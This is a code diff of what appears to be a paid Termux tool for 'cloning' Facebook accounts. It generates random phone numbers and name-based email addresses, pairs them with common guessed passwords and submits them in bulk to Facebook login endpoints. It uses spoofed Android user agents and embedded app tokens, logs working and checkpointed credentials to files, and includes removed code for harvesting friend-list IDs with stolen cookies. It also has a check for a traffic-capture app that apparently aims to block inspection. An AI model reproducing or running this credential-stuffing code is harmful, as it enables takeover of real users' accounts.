+		plist = []
+		try:
+			ps_limit = int(input(' How many passwords do you want to add ? '))
+		except:
+			ps_limit =1
+		linex()
+				
+		linex()
+		for i in range(ps_limit):
+			plist.append(input(f' Put password {i+1}: '))
+		linex()
+		print(' Do you went show cp account? (y/n): ')
+		linex()
+		cx=input(' Choose: ')
+		if cx in ['y','Y','yes','Yes','1']:
+			pcp.append('y')
+		else:
+			pcp.append('n')
+		with tred(max_workers=30) as crack_submit:
+			clear()
+			total_ids = str(len(fo))
+					
+			linex()
+			for user in fo:
+				ids,names = user.split('|')
+				passlist = plist
+				if mthd in ['1','01']:
+					crack_submit.submit(ffb,ids,names,passlist)
+				elif mthd in ['2','02']:
+					crack_submit.submit(mmm,ids,names,passlist)
+				else:
+					crack_submit.submit(api,ids,names,passlist)
+		print('\033[1;91m')
+		linex()
+		print(' The process has completed')
+		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+		linex()
+		input(' Press enter to back ')
+		os.system('python AB KHANX.py')
+	elif xd in ['2','02']:
+		create_file_login()
+	elif xd in ['3','03']:
+		public()
+	elif xd in ['4','04']:
+		clear()
+		print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] gmail cloning\n [0] Back menu')
+		linex()
+		x=input(' Choose: ')
+		if x in ['1','01']:
+			pak()
+		elif x in ['2','02']:
+			bd()
+		elif x in ['3','03']:
+			gmail()
+		else:
+			menu()
+			
+	elif xd in ['5','05']:
+	   gmail()
+	elif xd in ['6','06']:
+	    sids()
+	elif xd in ['7','07']:
+		remove_dub()
+	elif xd in ['8','08']:
+		os.system('rm -rf fb_cookies.txt')
+	elif xd in ['9','09']:
+		os.system(f'xdg-open https://m.me/KINGXMRSW4TI');menu()
+			
+	elif xd in ['0','00']:
+		exit(' KHUDA HAFIZ ')
+	else:
+		exit(' Option not found in menu...')
+		
+def pak():
 		user=[]
-		print(" [*] First Name Example Hamza,Areesha")
-		first = input(" First Name : ")
-		last = input(" Last Name : ")
-		print(" \n [*] Ex @gmail.com,@yahoo.com or @hotmail.com etc")
-		domain = input(" Domain : ")
-		print("\n [?] Limit ids Example 1000,5000,50000")
-		limit = int(input(" Limit Ids : "))
-		for nmbr in range(limit):
-			nmpp = random.randint(99,9999)
-			nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
-			naseeb = open('...txt','a').write(nmp)
-		self.id = open('...txt').read().splitlines()
-		self.pasw()
-	def cracknum(self,id):
-		global methods
-		os.system('clear');print(logo)
-		print('\033[0mFor Example :\033[0m 92310,92342,92300,92301 ...')
-		kode = input('\033[0mChoose Code : \033[0m')
-		print('\033[0mFor Example :\033[0m 2000,4000,6000 ...')
-		limit = int(input('\033[0mIdz Limit : \033[0m'))
+		clear()
+		print('\033[1;31m Code example: 0306,0315,0335,0345')
+		code = input('\033[1;32m put code: ')
+		try:
+			limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;91m put limit: '))
+		except ValueError:
+			limit = 5000
+		linex()
+		print(' [1] Method 1\n [2] Method 2 Best ')
+		linex()
+		mthd = input(' Choose: ')
+		linex()
+		print(' [1] Clone with 7+11 digit pass (v-fast)\n [2] Clone with auto pass (fast)\n [3] Clone with auto pass v2 (slow-best) ')
+		linex()
+		pcs = input(' [?] Select: ')
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(7))
-			xoo = kode+nmp.replace(" ","")
-			xdr = f"{kode+nmp}|{nmp} {xoo}\n"
-			naseeb = open('...txt','a').write(xdr)
-		self.id = open('...txt').read().splitlines()
-		self.pasw()
-	def m1(self,iid,name,passlist):
-		try:
-			global ok,loop,android_models
-			sys.stdout.write('\r[QSR] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
-			fn = name.split(' ')[0]
-			try:
-				ln = name.split(' ')[1]
-			except:
-				ln = fn
-			for pw in passlist:
-				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
-				password = pas
-				agent = "Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(8,13))+"; "+mobile_names+" LD7 Build/"+one_string_two_ip+") [FBAN/MobileAdsManagerAndroid;FBAV/"+five_ip+";FBBV/400263992;FBRV/401621336;FBLC/en_US;FBMF/"+mobile_names+" MOBILE LIMITED;FBBD/"+mobile_names+";FBDV/"+mobile_names+" LD7;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width=720,height=1452};FB_FW/1;]"
-				url = 'https://b-graph.facebook.com/auth/login'
-				head = {"user-agent": agent,"Content-Type": "application/json;charset=utf-8","Content-Length": "599","Host":"graph.facebook.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
-				data = {"locale":"en_US","format":"json","email":iid,"password":pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":1}
-				po = requests.post("https://graph.facebook.com/auth/login",data=data,headers=head).json()
-				print(po)
-				try:
-					roid = str(po['uid'])
-				except:
-					roid = iid
-				if 'session_key' in po:
-					print(' \033[1;32m[QSR-OK] '+roid+' | '+pas+'\033[0;97m')
-					open('/sdcard/qsr_ok.txt','a').write(roid+'|'+pas+'\n')
-					ok.append(iid)
-					break
-				if 'Please Confirm Email' in po:
-					print(' \033[1;32m[QSR-OK] '+roid+' | '+pas+'\033[0;97m')
-					open('/sdcard/qsr_ok.txt','a').write(roid+'|'+pas+'\n')
-					ok.append(iid)
-					break
-				if 'User must verify their account' in po:
-					try:
-						print(' \033[1;31m[QSR-CP] '+roid+' | '+pas+'\033[0;97m')
-						open('/sdcard/qsr_cp.txt','a').write(roid+'|'+pas+'\n')
-						break
-					except Exception as e:
-						pass
+			user.append(nmp)
+		with tred(max_workers=30) as AXI:	
+			clear()
+			tl = str(len(user))
+			print(' Total idz : \033[1;32m'+tl+f' ')
+			print(f'\033[1;32m Your selected code ..:\033[1;32m '+code)
+			print(f'\033[1;32m \x1b[38;5;208mif you Show no result use flight mode\033[1;97m')
+			linex()
+			for psx in user:
+				ids = code+psx
+				if pcs in ['1','01']:
+					passlist = [psx,ids]
+				elif pcs in ['2','02']:
+					passlist = [psx,ids,'khankhan','khan1122','Ali786','khan1234']
 				else:
-					continue
-			loop+=1
-		except Exception as e:
-			pass
-			#print(e)
-			
-	def pasw(self):
-		passlist = []
-		os.system('clear')
-		print(logo)
-		pl = int(input(' How Much Password Do You Want To Add ? '))
-		print(' Example first123,last123,khan123,firstlast')
-		print(50*"-")
-		for cd in range(pl):
-			passlist.append(input(f' ({cd+1}) Password : '))
-		os.system('clear')
-		print(logo)
-		print(' Total Ids : '+str(len(self.id)))
-		print(' Cloning Is Started Wait For Results')
-		print(' After Every 5 Min Turn Airplane On/Off')
-		print(50*'-')
-		with ThreadPool(max_workers=30) as formSubmit:
-			for user in self.id:
-				iid,name = user.split('|')
-				formSubmit.submit(self.m1,iid,name,passlist)
-		print(50*'-')
-		print(' SucessFully Process Is Completed ')
-		print(' Total Ok Ids : '+str(len(ok)))
-		print(' Ok Ids Save In : /sdcard/qsr_ok.txt')
-		print(50*'-')
-		input('\n Press enter to back ')
-		main()
+					passlist = [psx,ids,'khankhan','khan1122','Ali786','khan1234','Ali123','ali786','khan123','khan12345']
+				if mthd in ['1','01']:
+					AXI.submit(rcrack1,ids,passlist)
+				else:
+					AXI.submit(rcrack,ids,passlist)
+		print('\033[1;91m')
+		linex()
+		print(' The process has completed')
+		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+		linex()
+		input(' Press enter to back ')
+		os.system('python AB KHANX.py')
+def bd():
+		user=[]
+		clear()
+		print('\033[1;32m Code example: 016,017,018,019')
+		code = input('\033[1;32m put code: ')
+		try:
+			limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;91m put limit: '))
+		except ValueError:
+			limit = 5000
+		linex()
+		print(' [1] Method 1\n [2] Method 2 ')
+		linex()
+		mthd = input(' Choose: ')
+		for nmbr in range(limit):
+			nmp = ''.join(random.choice(string.digits) for _ in range(8))
+			user.append(nmp)
+		with tred(max_workers=30) as AXI:	
+			clear()
+			tl = str(len(user))
+			print(' Total idz : \033[1;32m'+tl+f' ')
+			print(f'\033[1;32m Choice code ..:\033[1;32m '+code)
+			print(f'\033[1;32m \x1b[38;5;208mUse flight mode for best result\033[1;97m')
+			linex()
+			for psx in user:
+				ids = code+psx
+				passlist = [psx,ids]
+				if mthd in ['1','01']:
+					AXI.submit(rcrack1,ids,passlist)
+				else:
+					AXI.submit(rcrack,ids,passlist)
+		print('\033[1;91m')
+		linex()
+		print(' The process has completed')
+		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+		linex()
+		input(' Press enter to back ')
+		os.system('python AB KHANX.py')
+def gmail():
+		os.system('rm -rf .re.txt')
+		clear()
+		print('\033[1;32m example: muhammad, ali, sajjad, faizan , Awais\033[1;97m')
+		linex()
+		first = input(' Put first name: ')
+		linex()
+		print('\033[1;32m example: khan, ahmad, ali \033[1;97m')
+		linex()
+		last = input(' Put last name: ')
+		linex()
+		print(' Example: @gmail.com , @yahoo.com etc...')
+		linex()
+		domain = input(' domain: ')
+		linex()
+		try:
+			limit=int(input(' Put limit: '))
+		except ValueError:
+			limit = 5000
+		linex()
+		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
+		linex()
+		pxc = input(' Choose : ')
+		linex()
+		print(' [1] Method 1\n [2] Method 2 ')
+		linex()
+		mthd = input(' Choose: ')
+		linex()
+		print(' Getting gmails...')
+		lists = ['3','4']
+		for xd in range(limit):
+			lchoice = random.choice(lists)
+			if '3' in lchoice:
+				mail = ''.join(random.choice(string.digits) for _ in range(3))
+				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+			else:
+				mail = ''.join(random.choice(string.digits) for _ in range(4))
+				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+			fo = open('.re.txt', 'r').read().splitlines()
+		with tred(max_workers=30) as AXI:
+			total = str(len(fo))
+			clear()
+			print(' Total idz : \033[1;32m'+total+f' ')
+			print("\033[1;91m \x1b[38;5;208mUse flight mode for Best result\033[1;91m")
+			linex()
+			for user in fo:
+				ids,names = user.split('|')
+				first_name = names.rsplit(' ')[0]
+				try:
+					last_name = names.rsplit(' ')[1]
+				except IndexError:
+					last_name = 'Khan'
+				fs = first_name.lower()
+				ls = last_name.lower()
+				if pxc in ['1','01']:
+					passlist = [fs+ls,fs+' '+ls,fs]
+				elif pxc in ['2','02']:
+					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']
+				elif pxc in ['3','03']:
+					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']
+				else:
+					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
+				if mthd in ['1','01']:
+					AXI.submit(rcrack1,ids,passlist)
+				else:
+					AXI.submit(rcrack,ids,passlist)
+		print('\033[1;91m')
+		linex()
+		print(' The process has completed')
+		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+		linex()
+		input(' Press enter to back ')
+		os.system('python AB KHANX.py')
  
-def create_file():
-	os.system('clear')
-	print(logo);
-	print(' [1] Create File ')
-	print(' [2] Remove Double Ids ')
-	print(' [3] Seprate Ids ')
-	print(' [0] Back')
-	print(50*'-')
-	create_ = input(' Select : ')
-	if create_ == "1":
-		create_file_login()
-	elif create_ == "2":
-		double()
-	elif create_ == "3":
-		sep()
-	elif create_ == "0":
-		main()
-	else:
-		exit('invalid select')
-	mycrackistan()	
- 
-def create_file_login():
-	ids = []
-	total = []
-	xyz = requests.Session()
-	os.system('clear')
-	print(logo);
+def ffb(ids,names,passlist):
+	global loop,oks,cps
+	sys.stdout.write('\r\r\033[1;32m [AFG] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
+	session = requests.Session()
 	try:
-		cok = open('fb_cookies.txt','r').read()
-		cookies = {'cookie':cok}
-		access_token = open('access_token.txt', 'r').read()
-	except FileNotFoundError:
-		login()
-	try:
-		check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
-		load = json.loads(check_cookies)
-		iid = load['id']
-		name = load['name']
-	except KeyError:
-		print('\n Cookies has expired')
-		time.sleep(1)
-		os.system('rm -rf .fb_cookies.txt .access_token.txt')
-		login()
+		first = names.split(' ')[0]
+		try:
+			last = names.split(' ')[1]
+		except:
+			last = 'Khan'
+		ps = first.lower()
+		ps2 = last.lower()
+		for fikr in passlist:
+			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+			ua=random.choice(ugen)
+			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+			AXI=session.cookies.get_dict().keys()
+			if "c_user" in AXI:
+				coki=session.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+				print('\r\r\033[1;32m [AFGHAN-OK] %s | %s'%(ids,pas))
+				open('/sdcard/AFGHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				oks.append(ids)
+				break
+			elif 'checkpoint' in AXI:
+				if 'y' in pcp:
+					print('\r\r\x1b[38;5;208m [AFGHAN-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/AFGHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					cps.append(ids)
+					break
+				else:
+					break
+			else:
+				continue
 	except requests.exceptions.ConnectionError:
-		print(' No internet connection ...')
-	os.system('clear')
-	print(logo);
-	print("[1] Create File Mix Ids")
-	print("[2] Create File New Ids")
-	print(44*"-")
-	typp = input('select : ')
-	if typp == "1":
-		auto_file(cookies,access_token)
-	elif typp == "2":
-		new_file(cookies,access_token)
-	else:
-		auto_file(cookies,access_token)
+		time.sleep(20)
+	loop+=1
  
-def auto_file(cookies,access_token):
-	global total
-	os.system('clear & rm -rf .txt .temp.txt')
-	os.system('clear')
-	print(logo);
+def rcrack1(ids,passlist):
+	global loop
+	global oks
 	try:
-		fl = 1
-	except:
-		fl = 1
-	for xd in range(fl):
-		idt = input(f' Put id {xd+1}: ')
-		try:
-			fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
-			xyz = requests.Session()
-			r = xyz.get(fd_url,cookies=cookies).text
-			q = json.loads(r)
-			for iid in q['friends']['data']:
-				uid = iid['id']
-				open('.txt','a').write(uid+'\n')
-		except KeyError:
-			print(' No Friend List : '+idt)
-			time.sleep(3)
-			return auto_file(cookies,access_token)
-		except requests.exceptions.ConnectionError:
-			print(' No internet connection ....')
-	sid = "1"
-	os.system('cat .txt | grep "'+sid+'" > .temp.txt')
-	file = open('.temp.txt','r').read().splitlines()
-	print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')
-	#100010138361148
-	sf = input(' Saved File As : ')
-	print('')
-	os.system('clear')
-	print(logo);
-	print(' Total ids To Dump: '+str(len(file)))
-	print(' Dumping Is Started Wait ....')
-	print(50*'-')
-	with ThreadPool(max_workers=20) as yaari:
-		for exid in file:
-			yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
-	print(' Total ids Extracted : '+str(len(total)))
-	input(' Press enter to back ')
-	main()
- 
-def new_file(cookies,access_token):
-	global total
-	os.system('clear & rm -rf .txt .temp.txt')
-	os.system('clear')
-	print(logo);
-	try:
-		fl = 1
-	except:
-		fl = 1
-	for xd in range(fl):
-		idt = input(f' Put id {xd+1}: ')
-		try:
-			fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
-			xyz = requests.Session()
-			r = xyz.get(fd_url,cookies=cookies).text
-			q = json.loads(r)
-			for iid in q['friends']['data']:
-				uid = iid['id']
-				open('.txt','a').write(uid+'\n')
-		except KeyError:
-			print(' No Friend List : '+idt)
-			time.sleep(3)
-			return auto_file(cookies,access_token)
-		except requests.exceptions.ConnectionError:
-			print(' No internet connection ....')
-	print('\n\033[1;92m Example: 100087,100088 etc\033[0;97m')
-	try:
-		sl = int(input('\n How Many Links To Grab : '))
-	except:
-		sl = 1
-	for el in range(sl):
-		sid = input(f' Put {el+1} link: ')
-		os.system('cat .txt | grep "'+sid+'" > .temp.txt')
-	file = open('.temp.txt','r').read().splitlines()
-	print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')
-	#100010138361148
-	sf = input(' Saved File As : ')
-	print('')
-	os.system('clear')
-	print(logo);
-	print(' Total ids To Dump: '+str(len(file)))
-	print(' Dumping Is Started Wait ....')
-	print(50*'-')
-	with ThreadPool(max_workers=20) as yaari:
-		for exid in file:
-			yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
-	try:
-		son = f"qaiser{str(random.randint(0,90))}.txt"
-	except:
-		son = f"qaiser{str(random.randint(10,50))}.txt"
-	os.system(f'cat {sf} | grep "'+sid+'" > /sdcard/'+son+'')
-	print(' Total ids Extracted : '+str(len(total)))
-	print(' New ids Saved As : /sdcard/'+son)
-	print(' Normal ids Saved As : '+sf)
-	input(' Press enter to back ')
-	main()
- 
-def iamBadBoy(exid,cookies,access_token,sf):
-	try:
-		global total,loop
-		fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
-		xyz = requests.Session()
-		r = xyz.get(fd_url,cookies=cookies).text
-		q = json.loads(r)
-		for yaad in q['friends']['data']:
-			iid = yaad['id']
-			name = yaad['name']
-			total.append(iid)
-			open(sf,'a').write(iid+'|'+name+'\n')
+		for pas in passlist:
+			sys.stdout.write('\r\r\033[1;32m [AFG] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
+			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
+			application_version_code=str(random.randint(000000000,999999999))
+			__iam_genius = random.choice(android_models)
+			phone_model = __iam_genius.split('|')[0]
+			phone_company = __iam_genius.split('|')[1]
+			dimensions = __iam_genius.split('|')[2]
+			ffb=random.choice(fbks)
+			dvlk = random.choice(usr)
+			ua=random.choice(ugen)
+			ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/11;;FBDM/'+'{density=3.0,height=360,width=800};]'
+			li = ['28','29','210']
+			li2 = random.choice(li)
+			j1 = ''.join(random.choice(digits) for _ in range(2))
+			j2 = li2+j1
+			device_family_id = str(uuid.uuid4())
+			adid = str(uuid.uuid4())
+			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
+			data = {'adid':adid,
+			'format':'json',
+			'device_id':device_family_id,
+			'email':ids,
+			'password':pas,
+			'generate_analytics_claim':'1',
+			'community_id':'','cpl':'true','try_num':'1',
+			'family_device_id':device_family_id,
+			'credentials_type':'device_based_login_password',
+			'generate_session_cookies':'1',
+			'error_detail_type':'button_with_disabled',
+			'source':'device_based_login',
+			'machine_id':machine_id,
+			'login_location_accuracy_m':'1.0',
+			'meta_inf_fbmeta':'',
+			'advertiser_id':adid,
+			'encrypted_msisdn':'',
+			'currently_logged_in_userid':'0',
+			'locale':'en_PK',
+			'client_country_code':'PK',
+			'method':'auth.login',
+			'fb_api_req_friendly_name':'authenticate',
+			'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
+			'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+			head = {
+			'content-type':'application/x-www-form-urlencoded',
+			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
+			'x-fb-connection-type':'unknown',
+			'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+			'user-agent':ua,
+			'x-fb-net-hni':str(random.randint(2e4,4e4)),
+			'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
+			'x-fb-connection-quality':'EXCELLENT',
+			'x-fb-friendly-name':'authenticate',
+			'accept-encoding':'gzip, deflate',
+			'x-fb-http-engine':	'Liger'}
+			url = 'https://b-api.facebook.com/method/auth.login'
+			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
+			q = json.loads(po)
+			if 'session_key' in q:
+				udx = str(q['uid'])
+				print('\r\r\033[1;32m [AFGHAN-OK] '+udx+' | '+pas+'\033[1;97m')
+				open('/sdcard/AFGHAN-OK.txt', 'a').write(udx+'|'+pas+'\n')
+				oks.append(ids)
+				break
+			elif 'www.facebook.com' in q['error_msg']:
+				print('\r\r\x1b[38;5;208m [AFAQ-CP] '+ids+' | '+pas+'\033[1;97m')
+				open('/sdcard/AFAQ-CP.txt','a').write(ids+'|'+pas+'\n')
+				cps.append(ids)
+				break
+			else:
+				continue
 		loop+=1
-		sys.stdout.write('\r Dumping Ids [%s] : [%s]\r'%(loop,len(total)));sys.stdout.flush()
 	except requests.exceptions.ConnectionError:
-		print(' No internet connection ...')
+		time.sleep(10)
 	except Exception as e:
 		pass
-		#print(e)
-	except KeyError:
+def rcrack(ids,passlist):
+	global loop
+	global oks
+	try:
+		for pas in passlist:
+			sys.stdout.write('\r\r\033[1;32m [SW4TI] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
+			session = requests.Session()
+			pro = random.choice(ugen)
+			free_fb = session.get('https://free.facebook.com').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":ids,
+			"pass":pas,
+			"login":"Log In"}
+			header_freefb = {'authority':'web.facebook.com',
+			'method': 'POST',
+			'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
+			'cache-control': 'max-age=0',
+			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
+			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"macOS"',
+			'sec-fetch-dest': 'document',
+			'sec-fetch-mode': 'navigate',
+			'sec-fetch-site': 'none',
+			'sec-fetch-user': '?1',
+			'upgrade-insecure-requests': '1',
+			'user-agent': pro}
+			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[7:22]
+				if uid in oks:pass
+				else:
+					if 'checkpoint' in str(lo):
+						print('\r\r\033[1;34m [AFAQ-TL] '+ids+' | '+pas)
+					else:
+						print(f'\r\x1b[1;32m [AFGHAN-OK] '+ids+' | '+pas)
+						cek_apk(session,coki)
+						open('/sdcard/AFGHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
+						oks.append(uid)
+						break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[24:39]
+				if uid in cps:pass
+				else:
+					print('\r\r\x1b[38;5;208m [AFGHAN-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/AFGHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					cps.append(ids)
+					break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(10)
+	except:
 		pass
  
-def sep():
-	
-	os.system('clear');print(logo);
-	try:
-		limit = int(input(' How many links do you want to separate ? '))
-	except:
-		limit = 1
-	print(f'{rg} File Path Example /sdcard/xxx.txt{s}')
-	file_name = input('\033[0m Input file path : ')
-	print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
-	new_save = input('\033[0m Save new file as : ')
-	y = 0
-	print(f"{ro} Ids To Grabb Ex [ 100087,10000,10006 etc ]{s}")
-	for k in range(limit):
-		y+=1
-		links=input(' Put Uid Type : ')
-		os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
-	print(44*"\033[0m-")
-	print(f'{rc} ids grabbed successfully{s}')
-	print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
-	print('\033[0m New file saved as : \033[0;33m '+new_save)
-	print(44*"\033[0m-")
-	input('\033[0m[Press enter to back] ')
-	main()
+def menu_apikey():
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "_".join(uuid)
+  server = requests.get('https://github.com/NSKBRAND/Approval.txt').text
+  
  
-def sep():
-	
-	os.system('clear');print(logo);
-	try:
-		limit = int(input(' How many links do you want to separate ? '))
-	except:
-		limit = 1
-	print(f'{rg} File Path Example /sdcard/xxx.txt{s}')
-	file_name = input('\033[0m Input file path : ')
-	print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
-	new_save = input('\033[0m Save new file as : ')
-	y = 0
-	print(f"{ro} Ids To Grabb Ex [ 100087,10000,10006 etc ]{s}")
-	for k in range(limit):
-		y+=1
-		links=input(' Put Uid Type : ')
-		os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
-	print(44*"\033[0m-")
-	print(f'{rc} ids grabbed successfully{s}')
-	print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
-	print('\033[0m New file saved as : \033[0;33m '+new_save)
-	print(44*"\033[0m-")
-	input('\033[0m[Press enter to back] ')
-	main()
-	
-def double():
-	os.system('clear')
-	print(logo)
-	user_file = input('File Path : ')
-	try:
-		open(user_file,'r').read()
-		print(' \n\033[1;97mExample: /sdcard/xxx.txt\n\033[0;97m')
-		save_file = input('Save new file as: ')
-		os.system('touch '+save_file)
-		os.system('sort -r '+user_file+' | uniq > '+save_file)
-		print(50*'-')
-		print(' Fully Removed Multi Lines Ids')
-		print(' Dublicate Lines Removed From File')
-		print(' File Saved As : '+save_file)
-		print(50*'-')
-		input('Press enter to back ')
-		main()
-	except FileNotFoundError:
-		print(' Invalid File ')
  
-#----[http-capture]----
+  os.system(" clear")                          
+  print("""\033[1;37m
+    \033[1;32m_______________________________________
+    \033[1;32m     
+ █████╗ ███████╗ ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗
+██╔══██╗██╔════╝██╔════╝ ██║  ██║██╔══██╗████╗  ██║
+███████║█████╗  ██║  ███╗███████║███████║██╔██╗ ██║
+██╔══██║██╔══╝  ██║   ██║██╔══██║██╔══██║██║╚██╗██║
+██║  ██║██║     ╚██████╔╝██║  ██║██║  ██║██║ ╚████║
+╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
+                                                   
+ 
+    \033[1;33m      
+    \033[1;34m    
+    \033[1;35m    
+    
+    \033[1;36m    
+    \033[1;32m_______________________________________
+\033[1;37m[-] AUTHOR    :\033[1;32m Roohullah Afghan
+\033[1;37m[-] GITHUB    :\033[1;32m AFG-Cloner2
+\033[1;37m[-] WhatsApp  :\033[1;32m +923139974897
+\033[1;37m[-] TOOLS     :\033[1;32m MIX CLONING
+\033[1;37m[-] VERSION   :\033[1;32m 0.1
+\033[1;37m[-] STATUS    :\033[1;32m PAID
+==================================================
+\033[1;33m[*]TOOLS  : Facebook cloning
+\033[1;37m[*]Status : PAID
+==================================================
+ \33[37;41m\t IF YOU ARE FREE USER DON'T INBOX\33[0;m
+\033[1;93m=================================================
+ \033[1;35m[*]First read NOTE:
+ \033[1;37m[1]if facebook go on update you get not
+ \033[1;37m[*]Ok idz we dont  responsible 
+ \033[1;37m[2]you unstall termux and key need approval
+================================================== 
+ [*] File cloning
+ [*] Create file
+ [*] Public cloning
+ [*] Random cloning
+ [*] Gmail cloning
+ [*] Separate ids
+ [*] remove dublicate lines from file              [8] login another cookie
+ [*] contact with owner
+ [0] Exit menu
+==================================================   """)
+ 
+        
 try:
-	a = "anar"
-	t="tt"
-	fileee = os.listdir('/sdcard/Android/data/')
-	if f'com.h{t}pc{a}y.pro' in fileee:
-		print('error occur 0')
-		#exit()
-		#exit(f'\nsomethiiing went wrong\n\nContact Admin : +923301579625')
-except Exception as e:
-	print(e)
-	pass
